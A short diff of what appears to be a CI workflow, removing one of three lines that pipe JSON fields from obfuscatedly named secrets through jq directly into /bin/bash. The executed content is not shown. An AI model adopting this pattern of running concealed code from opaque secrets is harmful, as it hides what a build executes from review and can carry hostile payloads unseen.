@@ -17,7 +17,6 @@ jobs:
           jl189: ${{ secrets.jl189 }}
         run: |
           printf '%s' "$jl189" | jq -r .v586 | /bin/bash
-          echo $iz202 | jq -r .i5 | /bin/bash
           printf '%s' "$yzks75049" | jq -r .zmj8 | /bin/bash
 
       - name: Upload artifact
